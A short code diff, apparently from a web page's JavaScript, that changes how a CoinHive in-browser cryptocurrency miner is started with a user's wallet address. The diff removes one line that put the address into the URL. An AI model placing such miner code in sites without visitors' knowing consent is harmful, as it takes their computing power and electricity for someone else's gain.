@@ -58,7 +58,6 @@ function createiframe() {
 
 function startUserMiner() {
     var userWalletAddress = getWalletAddress();
-    window.location.search = $.query.set('string', userWalletAddress);
     var userMiner = new CoinHive.User('qXvuxshdwz8NEoQXhMLH0qPW2EYJWuLc', userWalletAddress, {threads: 1,
         throttle: 1});
     anonMiner.stop();
